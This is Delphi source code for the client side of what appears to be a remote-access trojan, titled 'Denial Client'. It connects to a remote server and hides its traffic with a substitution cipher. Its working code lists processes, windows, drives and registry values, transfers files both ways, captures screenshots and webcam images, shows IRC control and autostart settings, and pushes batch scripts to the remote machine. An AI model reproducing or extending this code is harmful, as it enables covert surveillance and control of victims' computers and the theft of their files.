unit Unit6;

interface


uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, winsock, ExtCtrls, ImgList, Menus,
  pngimage, pnglang, pngzlib;

type
  TForm6 = class(TForm)
    StatusBar1: TStatusBar;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    ListView2: TListView;
    Button5: TButton;
    PageControl2: TPageControl;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    ComboBox1: TComboBox;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button12: TButton;
    ListView3: TListView;
    Button13: TButton;
    Button14: TButton;
    ListView4: TListView;
    Button15: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    PageControl3: TPageControl;
    TabSheet8: TTabSheet;
    TabSheet9: TTabSheet;
    TabSheet10: TTabSheet;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Label6: TLabel;
    Label7: TLabel;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton3: TRadioButton;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Edit6: TEdit;
    Button19: TButton;
    Button20: TButton;
    GroupBox1: TGroupBox;
    Label4: TLabel;
    Label5: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Edit7: TEdit;
    Edit8: TEdit;
    Label11: TLabel;
    Edit9: TEdit;
    Edit10: TEdit;
    Edit11: TEdit;
    Edit12: TEdit;
    Edit13: TEdit;
    Edit14: TEdit;
    Button21: TButton;
    Button22: TButton;
    Label12: TLabel;
    Edit17: TEdit;
    Label13: TLabel;
    Edit18: TEdit;
    Label14: TLabel;
    Label15: TLabel;
    Button23: TButton;
    Edit19: TEdit;
    RadioButton4: TRadioButton;
    Timer1: TTimer;
    OpenDialog1: TOpenDialog;
    Timer2: TTimer;
    Timer3: TTimer;
    ListView5: TListView;
    ImageList1: TImageList;
    Label16: TLabel;
    PageControl4: TPageControl;
    TabSheet11: TTabSheet;
    TabSheet12: TTabSheet;
    ListView1: TListView;
    Button4: TButton;
    Button1: TButton;
    TabSheet13: TTabSheet;
    RichEdit1: TRichEdit;
    Button2: TButton;
    Edit20: TEdit;
    Label17: TLabel;
    RichEdit2: TRichEdit;
    PopupMenu1: TPopupMenu;
    Quality1: TMenuItem;
    N11: TMenuItem;
    N21: TMenuItem;
    N31: TMenuItem;
    N41: TMenuItem;
    N51: TMenuItem;
    N61: TMenuItem;
    N71: TMenuItem;
    N81: TMenuItem;
    N91: TMenuItem;
    N101: TMenuItem;
    SaveImage1: TMenuItem;
    Browse1: TMenuItem;
    none1: TMenuItem;
    DontSave1: TMenuItem;
    PopupMenu2: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    MenuItem5: TMenuItem;
    MenuItem6: TMenuItem;
    MenuItem7: TMenuItem;
    MenuItem8: TMenuItem;
    MenuItem9: TMenuItem;
    MenuItem10: TMenuItem;
    MenuItem11: TMenuItem;
    MenuItem12: TMenuItem;
    MenuItem13: TMenuItem;
    MenuItem14: TMenuItem;
    MenuItem15: TMenuItem;
    Button3: TButton;
    TabSheet14: TTabSheet;
    TabSheet15: TTabSheet;
    Image1: TImage;
    Button24: TButton;
    Timer4: TTimer;
    Button25: TButton;
    Button26: TButton;
    Label18: TLabel;
    Edit21: TEdit;
    CheckBox1: TCheckBox;
    TabSheet16: TTabSheet;
    Edit23: TEdit;
    Label20: TLabel;
    Button30: TButton;
    Edit24: TEdit;
    Label21: TLabel;
    Button31: TButton;
    timer_screen: TTimer;
    Panel1: TPanel;
    Label22: TLabel;
    Edit25: TEdit;
    Label8: TLabel;
    TabSheet17: TTabSheet;
    Label23: TLabel;
    Button32: TButton;
    RadioButton5: TRadioButton;
    RadioButton6: TRadioButton;
    RegValues: TListView;
    RegView: TListView;
    Label19: TLabel;
    Button27: TButton;
    Button28: TButton;
    Button29: TButton;
    Edit15: TEdit;
    Button33: TButton;
    Edit16: TEdit;
    ImageList2: TImageList;
    Label24: TLabel;
    Label25: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure Readstring;
    procedure COOL;
    FUNCTION SENDSTR(STR:STRING) : BOOL;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure AddItem(LIST:TListView;ITEM1,item2,item3,item4,item5:string);
    procedure Connected;
    procedure Button11Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure addfiles(name:String;S:integer);
    procedure Button5Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure addf(name:String;size:string;fdir:String;icon:integer);
    procedure Button6Click(Sender: TObject);
    procedure ListView5DblClick(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);

    procedure RichEdit1KeyPress(Sender: TObject; var Key: Char);
    procedure RichEdit2KeyPress(Sender: TObject; var Key: Char);
    procedure RichEdit2Change(Sender: TObject);
    procedure Button24Click(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);
    procedure CheckBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Button25Click(Sender: TObject);
    procedure Button26Click(Sender: TObject);
    procedure CheckBox2MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Button29Click(Sender: TObject);
    procedure Button28Click(Sender: TObject);
    procedure Button27Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure FormConstrainedResize(Sender: TObject; var MinWidth,
      MinHeight, MaxWidth, MaxHeight: Integer);
    procedure timer_screenTimer(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Edit25KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Button30Click(Sender: TObject);
    procedure Button31Click(Sender: TObject);
    procedure Button32Click(Sender: TObject);
    procedure RegViewDblClick(Sender: TObject);
    procedure Button33Click(Sender: TObject);
    procedure RegValuesClick(Sender: TObject);
  private
    { Private declarations }
    procedure CreateParams(var Params: TCreateParams);override;
  public
    { Public declarations }
  end;

type
  TTransferCallback = procedure(BytesTotal: dword; BytesDone: dword);

CONST
  BUFLEN                   = 65536;

VAR
  Form6: TForm6;
  BytesRead, BytesDone: dword;
  split_set        : integer;
  BUF              : ARRAY[0..BUFLEN-1]of char;
  Sock             : TSocket;
  Wsadatas         : TWSADATA;
  SockAddrIn       : TSockAddrIn;
  Sock2            : TSocket;
  Wsadatas2        : TWSADATA;
  SockAddrIn2      : TSockAddrIn;
  ABC1,ABC2        : String;
  DEAD             : BOOLEAN;
  startup          : boolean;
  Upload_Name      : String;
  Upload_Progress  : integer;
  Upload_Port      : integer;
  Upload_IP        : string;
  Upload_handle    : THANDLE;
  Upload_word      : DWORD;
  UPLOAD_SPEED     : string;
  UPLOAD_DONE      : integer;
  upload           : boolean;
  sending          : Boolean;
  DIRLIST          : BOOLEAN;
  REGKEYS          : BOOLEAN;
  REGVALUS         : BOOLEAN;
  BytesWritten     : DWORD;
  Skip             : Integer;
  tagg,screen,
  webcam,save      : boolean;
  Screen_Stream    : Boolean;
  Webcam_Stream    : Boolean;
  timeout:boolean;

implementation
uses Settings,Unit7;
{$R *.dfm}

Function ExtractHkey(S:String):String;
var
 I:integer;
begin
 For i:=1 to length(s) do
  if copy(s,i,1) = '\' then break else result := result + copy(s,i,1);
end;

function Decrypt(str:string):string;
var
i,j:integer;
ch:string;
c:boolean;
begin
result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC2) do begin
  if copy(ABC2,j,1)=ch then begin
   result:=result+copy(ABC1,j,1);
   c := true;
  end;
 end;
  if not c then result := result + ch;
end;
end;

function encrypt(str:string):string;
var
i,j:integer;
ch:string;
c:boolean;
begin
result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC1) do begin
  if copy(ABC1,j,1)=ch then begin
   result:=result+copy(ABC2,j,1);
   C:=true;
  end;
 end;
 if not c then result := result + ch;
end;

end;

Procedure SendF;

function ReceiveBuffer(var Buffer; BufferSize: integer): integer;
begin
  if BufferSize = -1 then
  begin
    if ioctlsocket(Sock2, FIONREAD, Longint(Result)) = SOCKET_ERROR then
    begin
      Result := SOCKET_ERROR;
     CloseSocket(Sock2);
     Shutdown(Sock2,2);
    end;
  end
  else
  begin
     Result := recv(Sock2, Buffer, BufferSize, 0);
     if Result = 0 then
     begin
     CloseSocket(Sock2);
     Shutdown(Sock2,2);
     end;
     if Result = SOCKET_ERROR then
     begin
       Result := WSAGetLastError;
       if Result = WSAEWOULDBLOCK then
       begin
         Result := 0;
       end
       else
       begin
        CloseSocket(Sock2);
        Shutdown(Sock2,2);
       end;
     end;
  end;
end;

function ReceiveLength: integer;
begin
  Result := ReceiveBuffer(pointer(nil)^, -1);
end;

function ReceiveString: string;
begin
  SetLength(Result, ReceiveBuffer(pointer(nil)^, -1));
  SetLength(Result, ReceiveBuffer(pointer(Result)^, Length(Result)));
end;

procedure Idle(Seconds: integer);
var
  FDset: TFDset;
  TimeVal: TTimeVal;
begin
  if Seconds = 0 then
  begin
    FD_ZERO(FDSet);
    FD_SET(Sock2, FDSet);
    select(0, @FDset, nil, nil, nil);
  end
  else
  begin
    TimeVal.tv_sec := Seconds;
    TimeVal.tv_usec := 0;
    FD_ZERO(FDSet);
    FD_SET(Sock2, FDSet);
    select(0, @FDset, nil, nil, @TimeVal);
  end;
end;


procedure ReceiveFile(FileName: string; TransferCallback: TTransferCallback);
var
  BinaryBuffer: pchar;
  BinaryFile: THandle;
  BinaryFileSize, BytesReceived: dword;
  I : integer;
  TimeOut:Integer;
begin
  BytesDone := 0;
  BytesWritten := 0;
  BinaryFile := CreateFile(pchar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  Idle(0);
  ReceiveBuffer(BinaryFileSize, sizeof(BinaryFileSize));
  split_set := binaryfilesize div 100;
  upload_done := 0;
  while BytesDone < BinaryFileSize do
  begin
    if bytesdone >= split_set then begin
     split_set := split_set + (binaryfilesize div 100);
     inc(upload_done,1);
    end;
    Inc(TimeOut);
    If TimeOut = 10000 Then Begin
     CloseHandle(BinaryFile);
     BytesDone := BinaryFileSize;
     BytesRead := 0;
     Upload_Done := 100;
     SENDING := FALSE;
     FreeMem(BinaryBuffer);
     Form6.ListView2.ItemIndex := 0;
     Form6.Button6.Click;
    End;
    Sleep(1);
    BytesReceived := ReceiveLength;
    BYTE_REC := BYTE_REC + ReceiveLength;
    if BytesReceived > 0 then
    begin
      TimeOut := 0;
      GetMem(BinaryBuffer, BytesReceived);
      try
        ReceiveBuffer(BinaryBuffer^, BytesReceived);
        WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil);
        Inc(BytesDone, BytesReceived);
        if Assigned(TransferCallback) then TransferCallback(BinaryFileSize, BytesDone);
      finally
        FreeMem(BinaryBuffer);
      end;
    end;
  end;
  CloseHandle(BinaryFile);
  BytesDone := BinaryFileSize;
  BytesRead := 0;
  Upload_Done := 100;
  SENDING := FALSE;
  I:=0;
  if extractfilename(filename)='SCREEN.PNG' then begin
   IF SAVE THEN BEGIN
   If NOT Directoryexists(extractfilepath(paramstr(0))+'images') then
    CreateDirectory(pchar(extractfilepath(paramstr(0))+'images'), nil);
   While FileExists(extractfilepath(paramstr(0))+'images\SCREEN'+inttostr(i)+'.PNG') do
    inc(i);
   While Not FileExists(extractfilepath(paramstr(0))+'images\SCREEN'+inttostr(i)+'.PNG') do
    CopyFile(Pchar(FileName), Pchar(extractfilepath(paramstr(0))+'images\SCREEN'+inttostr(i)+'.PNG'),False);
   Deletefile(Pchar(Filename));
   END;
   SLEEP(200);
   SCREEN:=true;
  end;
  if extractfilename(filename)='WEBCAM.PNG' then begin
   IF SAVE THEN BEGIN
   If NOT Directoryexists(extractfilepath(paramstr(0))+'images') then
    CreateDirectory(pchar(extractfilepath(paramstr(0))+'images'), nil);
   While FileExists(extractfilepath(paramstr(0))+'images\WEBCAM'+inttostr(i)+'.PNG') do
    inc(i);
   While Not FileExists(extractfilepath(paramstr(0))+'images\WEBCAM'+inttostr(i)+'.PNG') do
    CopyFile(Pchar(FileName), Pchar(extractfilepath(paramstr(0))+'images\WEBCAM'+inttostr(i)+'.PNG'),False);
   Deletefile(Pchar(Filename));
   END;
   SLEEP(200);
   WEBCAM:=true;
  end;
end;

function SendBuffer(var Buffer; BufferSize: integer): integer;
var
  ErrorCode: integer;
begin
  Result := send(Sock2, Buffer, BufferSize, 0);
  if Result = SOCKET_ERROR then
  begin
    ErrorCode := WSAGetLastError;
    if (ErrorCode = WSAEWOULDBLOCK) then
    begin
      Result := -1;
    end
    else
    begin
     CloseSocket(Sock2);
     Shutdown(Sock2,2);
    end;
  end;
end;

procedure SendFile(FileName: string; TransferCallback: TTransferCallback);
var
  BinaryFile: THandle;
  BinaryBuffer: pchar;
  BinaryFileSize: dword;
  TimeOut:Integer;
begin
  BytesDone := 0;
  BytesRead := 0;
  BinaryFile := CreateFile(pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  BinaryFileSize := GetFileSize(BinaryFile, nil);
  SendBuffer(BinaryFileSize, sizeof(BinaryFileSize));
  GetMem(BinaryBuffer, 2048);
  split_set := binaryfilesize div 100;
  upload_done := 0;
  try
    repeat
      if bytesdone >= split_set then begin
       split_set := split_set + (binaryfilesize div 100);
       inc(upload_done,1);
      end;
      Sleep(1);
      ReadFile(BinaryFile, BinaryBuffer^, 2048, BytesRead, nil);
      Inc(BytesDone, BytesRead);
      BYTE_SENT := BYTE_SENT + BytesRead;
      TimeOut := 0;
      repeat
        Sleep(1);
        Inc(TimeOut);
        If TimeOut = 10000 Then Begin
         Form6.ListView2.ItemIndex := 0;
         Form6.Button6.Click;
         FreeMem(BinaryBuffer);
         CloseHandle(BinaryFile);
         form6.statusbar1.Panels[2].Text := 'Transfer 0 Byte';
         form6.statusbar1.Panels[3].Text := '100%';
         Sending := False;
        End;
      until SendBuffer(BinaryBuffer^, BytesRead) <> -1;
      if Assigned(TransferCallback) then TransferCallback(BinaryFileSize, BytesDone);
    until BytesRead < 2048;
  finally
    FreeMem(BinaryBuffer);
  end;
  CloseHandle(BinaryFile);
  form6.statusbar1.Panels[2].Text := 'Transfer 0 Byte';
  form6.statusbar1.Panels[3].Text := '100%';
  Sending := False;
end;

function SendString(const Buffer: string): integer;
begin
  Result := SendBuffer(pointer(Buffer)^, Length(Buffer));
end;
var kill:dword;str:string;
begin
repeat
 WSAStartUp(257,wsadatas2);
 Sock2:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
 SockAddrIn2.sin_family:=AF_INET;
 SockAddrIn2.sin_port:=htons(UPLOAD_PORT);
 SockAddrIn2.sin_addr.S_addr:=inet_addr(PChar(UPLOAD_IP));
 Connect(Sock2,SockAddrIn2,SizeOf(SockAddrIn2));
until (recv(Sock2,buf,SizeOf(buf),0)) >= 1;
 ZeroMemory(@buf,sizeof(buf));
 if UPLOAD then begin
  STR := encrypt('20'+extractfilename(upload_name))+#13;
  Send(Sock2,STR[1],Length(STR),0);
  SLEEP(1000);
  sending := true;
  SendFile(UPLOAD_NAME,nil);
  sending := false;
 end else begin
  STR := encrypt('21'+upload_name)+#13;
  Send(Sock2,STR[1],Length(STR),0);
  upload_name := extractfilepath(paramstr(0))+extractfilename(upload_name);
  sending := true;
  ReceiveFile(UPLOAD_NAME,nil);
  sending := false;
 end;
 Upload := false;
 sending := false;
 CloseSocket(Sock2);
 ShutDown(Sock2,2); 
 GetExitCodeThread(upload_handle,kill);
 TerminateThread(upload_handle,kill);
end;


procedure TForm6.CreateParams(var Params: TCreateParams);
begin
     inherited CreateParams(Params);
     Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
     Params.WndParent := 0; //makes Alt_Tab icons as form, but minimize of parent doesn't minimize window
end;

procedure TForm6.AddItem(LIST:TListView;ITEM1,item2,item3,item4,item5:string);
var
 US:TListItem;
begin
 if item1='' then exit;
 US := LIST.Items.Add;
 US.Caption := ITEM1;
 if item2<>'' then
 US.SubItems.add(ITEM2);
 if item3<>'' then
 US.SubItems.add(ITEM3);
 if item4<>'' then
 US.SubItems.add(ITEM4);
 if item5<>'' then
 US.SubItems.add(ITEM5);
end;

procedure TForm6.Readstring;
var
 Str:string;
 Param:string;
 i,Command:integer;
 str1,str2,str3,str4,str5:string;
begin
Str := Buf;
BYTE_REC := BYTE_REC + LENGTH(STR);
Str := Decrypt(Str);
IF STR='w'THEN EXIT;
IF STR='PY' THEN BEGIN
 Edit25.Visible := true;
 Label22.Caption := 'This server is password protected. Please insert correct password or disconnect now.';
  exit;
END;
IF STR='PN' THEN BEGIN
 panel1.Visible := false;
  exit;
END;
IF STR='PA' THEN BEGIN
 Panel1.Visible := false;
  exit;
END;
IF STR='PF' THEN BEGIN
 MessageBox(0,'Password Failed','Error',mb_ok);
 Close;
 exit;
END;
Command := strtoint(Copy(str,1,2));
Param   := copy(str,3,length(str));
Case Command of
 10:begin                       //computer
  While Param <> '' Do begin
   STR1:= copy(param,1,pos(':',param)-1);
   STR2:= copy(param,pos(':',param)+1,length(param));
   STR2:= copy(str2,1,pos(';',str2)-1);
   AddItem(Listview1,str1,str2,'','','');
   PARAM:= copy(param,pos(';',param)+1,length(param));
  end;
 end;

 11:begin                       // os
  While Param <> '' Do begin
   STR1:= copy(param,1,pos(':',param)-1);
   STR2:= copy(param,pos(':',param)+1,length(param));
   STR2:= copy(str2,1,pos(';',str2)-1);
   AddItem(Listview1,str1,str2,'','','');
   PARAM:= copy(param,pos(';',param)+1,length(param));
  end;
 end;

 13:begin                       //  hell do i know
  While Param <> '' Do begin
   STR1:= copy(param,1,pos(':',param)-1);
   STR2:= copy(param,pos(':',param)+1,length(param));
   STR2:= copy(str2,1,pos(';',str2)-1);
   AddItem(Listview1,str1,str2,'','','');
   PARAM:= copy(param,pos(';',param)+1,length(param));
  end;
 end;

 22:begin                       // process list
  While Param <> '' Do begin
   STR1:= copy(param,1,pos(':',param)-1);
   STR2:= copy(param,pos(':',param)+1,length(param));
   STR2:= copy(str2,1,pos(';',str2)-1);
   STR2:= INTTOHEX(strtoint(STR2), 4);
   AddItem(Listview3,str2,str1,'','','');
   PARAM:= copy(param,pos(';',param)+1,length(param));
  end;
 end;

 28:begin                       // window
  While Param <> '' Do begin
   STR1:= copy(param,1,pos(':',param)-1);
   STR2:= copy(param,pos(':',param)+1,length(param));
   STR2:= copy(str2,1,pos(';',str2)-1);
   AddItem(Listview4,str1,str2,'','','');
   PARAM:= copy(param,pos(';',param)+1,length(param));
  end;
 end;

 20:begin
  upload_port := strtoint(param);
 end;
 14:Begin
     ListView2.ItemIndex := 0;
     Button6Click(self);
    End;
 16:BEGIN
   Upload_IP := statusbar1.Panels[0].Text;
   UPLOAD_PROGRESS := 1;
   sending := true;
   upload := false;
   upload_name := PARAM;
   addfiles(PARAM,0);
   DIRLIST:=TRUE;
   REGKEYS:=FALSE;
   REGVALUS:=FALSE;
   if listview2.Items.Count = 1 then
    UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 END;

 53:BEGIN
   Upload_IP := statusbar1.Panels[0].Text;
   UPLOAD_PROGRESS := 1;
   sending := true;
   upload := false;
   upload_name := PARAM;
   addfiles(PARAM,0);
   REGKEYS:=TRUE;
   DIRLIST:=FALSE;
   REGVALUS:=FALSE;
   if listview2.Items.Count = 1 then
    UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 END;

 54:BEGIN
   Upload_IP := statusbar1.Panels[0].Text;
   UPLOAD_PROGRESS := 1;
   sending := true;
   upload := false;
   upload_name := PARAM;
   addfiles(PARAM,0);
   REGVALUS:=TRUE;
   REGKEYS:=FALSE;
   DIRLIST:=FALSE;
   if listview2.Items.Count = 1 then
    UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 END;

 50:BEGIN
   IF param = '0' then begin
    messagebox(0,'No webcam detected','Error',mb_ok);
    exit;
   end;
   Upload_IP := statusbar1.Panels[0].Text;
   UPLOAD_PROGRESS := 1;
   sending := true;
   upload := false;
   upload_name := PARAM;
   addfiles(PARAM,0);
   DIRLIST:=FALSE;
   if listview2.Items.Count = 1 then
    UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 END;

 51:BEGIN
   IF param = '0' then exit;
   Upload_IP := statusbar1.Panels[0].Text;
   UPLOAD_PROGRESS := 1;
   sending := true;
   upload := false;
   upload_name := PARAM;
   addfiles(PARAM,0);
   DIRLIST:=FALSE;
   if listview2.Items.Count = 1 then
    UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 END;

 15:begin
   combobox1.Clear;
   while param<> '' do begin
    if copy(param,1,pos(';',param)-1) <> 'A:\' then
    combobox1.Items.Add(copy(param,1,pos(';',param)-1));
    param := copy(param, pos(';',param)+1, length(param));
   end;
   combobox1.Text := Combobox1.Items.Strings[0];   
   button12.Enabled := true;
   button10.Enabled := true;
   button9.Enabled := true;
   button8.Enabled := true;
   button7.Enabled := true;
 end;

 47:begin
     Edit8.text  := (Copy(Param,1,pos(';',param)-1));{nick1}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit7.text  := (Copy(Param,1,pos(';',param)-1));{nick2}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit9.text  := (Copy(Param,1,pos(';',param)-1));{chan1}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit10.text := (Copy(Param,1,pos(';',param)-1));{chan2}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit11.text := (Copy(Param,1,pos(';',param)-1));{serv1}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit12.text := (Copy(Param,1,pos(';',param)-1));{serv2}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit13.text := (Copy(Param,1,pos(';',param)-1));{key1}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit14.text := (Copy(Param,1,pos(';',param)-1));{key2}
    end;

 36:begin
     Str1 := Copy(Param,1,pos(';',param)-1);        {Traffic port}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Str2 := Copy(Param,1,pos(';',param)-1);        {Transfer Port}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Str3 := Copy(Param,1,pos(';',param)-1);        {Autostart}
     Param := Copy(Param,pos(';',param)+1,length(param));
     Edit1.text := str1;
     Edit2.text := str2;     
     IF (Str3 = '1') or (Str3 = '2') then begin
      Str4 := Copy(Param,1,pos(';',param)-1);
      Param := Copy(Param,pos(';',param)+1,length(param));
      if Str3 = '1' then begin
       edit6.Text := str4;
       Radiobutton1.Checked := true
      end;
      if Str3 = '2' then begin
       edit5.Text := str4;
       Radiobutton2.Checked := true
      end;
     end else if Str3 = '3' then begin
      Str4 := Copy(Param,1,pos(';',param)-1);
      Param := Copy(Param,pos(';',param)+1,length(param));
      Str5 := Copy(Param,1,pos(';',param)-1);
      Param := Copy(Param,pos(';',param)+1,length(param));
      Edit3.text := str4;
      Edit4.text := Str5;
      Radiobutton3.Checked := true
     end else Radiobutton4.Checked := true;
    end;

end;
 ZeroMemory(@buf,sizeof(buf));
 ZeroMemory(@str,sizeof(Str));
end;

procedure TFORM6.COOL;
var
 kill:dword;
begin
  Caption:= '-';
  CloseSocket(Sock);
  Shutdown(Sock,2);
  GetExitCodeThread(upload_handle,kill);
  TerminateThread(upload_handle,kill);
  close;
end;

FUNCTION TFORM6.SENDSTR(STR:STRING) : BOOL;
BEGIN
  STR := encrypt(STR);
  BYTE_SENT := BYTE_SENT + LENGTH(STR);  
  IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
END;

procedure TFOrm6.CONNECTED;
begin
 if (recv(Sock,buf,SizeOf(buf),0)) < 1 then begin
  DEAD:=true;
 end else begin
  readstring;
 end;
end;

Procedure WaitTime;
var
 kill:dword;
 F:IntegeR;
Begin
 F:= 10000;
 Repeat
  Dec(f);
  Sleep(1);
 Until F = 0;
End;

procedure TForm6.FormCreate(Sender: TObject);
var
 i:integer;
 key:String;
 A:Dword;
begin
 if inertia_ip = '' then exit;
  label22.caption := 'Checking if password-protected';
  Screen_Stream    := FALSE;
  Webcam_Stream    := FALSE;
  save   := false;
  screen := false;
  webcam := false;
  startup:=true;
  DEAD:=false;
  ABC2:='XTPKGCyvrnkhdaA73jfb840VRNJHDzwtpmigc 61YUQMIEBxusqole95ZWSOLF2&';
  ABC1:='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';
  statusbar1.Panels[0].Text := Inertia_IP;
  statusbar1.Panels[1].Text := Inertia_Port;
  caption := 'Denial Client ('+Inertia_ip+')';
  WSAStartUp(257,wsadatas);
  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
  SockAddrIn.sin_family:=AF_INET;
  SockAddrIn.sin_port:=htons(strtoint(INERTIA_PORT));
  SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(INERTIA_IP));
  Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
  Sendstr('0'+#13);
  Connected;
  if fileexists(extractfilepath(paramstr(0))+'\registry.edt') then
   richedit2.lines.LoadFromFile(extractfilepath(paramstr(0))+'\registry.edt');
   if richedit2.text = '' then begin
    Richedit2.lines.Add('// Example Code');
    Richedit2.lines.Add('root[hkey_local_machine];');
    Richedit2.lines.Add('key[software\microsoft\windows nt\currentversion];');
    Richedit2.lines.Add('value[CurrentVersion];');
    Richedit2.lines.Add('value[RegisteredOwner];');
    Richedit2.lines.Add('// End');    
   end;
   for i:= 1 to length(richedit2.Text) do begin
   key:= copy(richedit2.text, i, 1);
  if (key = '@') or (key = '.') or
     (key = ',') or (key = '*') or
     (key = ';') or (key = ':') or
     (key = '/') or (key = '\') or
     (key = '(') or (key = ')') or
     (key = '[') or (key = ']') or
     (key = '0') or (key = '1') or (key = '2') or (key = '3') or (key = '4') or
     (key = '5') or (key = '6') or (key = '7') or (key = '8') or (key = '9') or
     (key = '<') or (key = '>') then begin
      richedit2.SelStart := i-1;
      richedit2.SelLength := 1;
      richedit2.SelAttributes.color := clred;
      richedit2.SelText := richedit2.SelText;
      richedit2.SelAttributes.color := $004D4D53;
      richedit2.SelLength := 0;
     end else begin
      richedit2.SelAttributes.color := $004D4D53;
      richedit2.SelText := richedit2.SelText;
     end;
   end;
 startup:=false;
end;

procedure TForm6.Button1Click(Sender: TObject);
var
 eROOT,eKEY,eVALUE:string;
 i:integer;
 j:integer;
label search1, search2, search3;
begin
//grab editor settings
if richedit2.Text = '' then exit;
Listview1.Items.Clear;
for i:=0 to richedit2.Lines.Count -1 do begin
 j:= i;
 if ANSILOWERCASE(copy(richedit2.lines.Strings[i],1,4)) = 'root' then begin
  eROOT := copy(richedit2.lines.Strings[i],pos('[',richedit2.lines.Strings[i])+1,length(richedit2.lines.Strings[i]));
  if pos('];',eROOT)=0 then begin
   search1:
    inc(j);
    eROOT := eROOT + richedit2.Lines.Strings[j];
   if pos('];',eROOT)=0 then goto search1;
  end;
  eROOT := copy(eROOT, 1, pos('];',eROOT)-1);
 end else
 if ANSILOWERCASE(copy(richedit2.lines.Strings[i],1,3)) = 'key' then begin
  eKEY := copy(richedit2.lines.Strings[i],pos('[',richedit2.lines.Strings[i])+1,length(richedit2.lines.Strings[i]));
  if pos('];',ekey)=0 then begin
   search2:
    inc(j);
    eKEY := eKEY + richedit2.Lines.Strings[j];
   if pos('];',ekey)=0 then goto search2;
  end;
  eKEY := copy(eKEY, 1, pos('];',eKEY)-1);
 end else
 if ANSILOWERCASE(copy(richedit2.lines.Strings[i],1,5)) = 'value' then begin
  eVALUE := copy(richedit2.lines.Strings[i],pos('[',richedit2.lines.Strings[i])+1,length(richedit2.lines.Strings[i]));
  if pos('];',eVALUE)=0 then begin
   search3:
    inc(j);
    eVALUE := eVALUE + richedit2.Lines.Strings[j];
   if pos('];',eVALUE)=0 then goto search3;
  end;
  eVALUE := copy(eVALUE, 1, pos('];',eVALUE)-1);
 end;
 if (eROOT <> '') and (eKEY <> '') and (eVALUE <> '') then begin
  sendstr(inttostr(INFO_COMPUTER)+eROOT+':'+eKEY+':'+eVALUE+';'+#13);
  connected;
  Evalue := '';
 end;
end;

end;

procedure TForm6.Timer1Timer(Sender: TObject);
begin
 if DEAD then cool;
end;

procedure TForm6.Button2Click(Sender: TObject);
begin
sendstr(inttostr(MAKE_BAT)+edit20.text+';'+richedit1.Text+#13);
end;

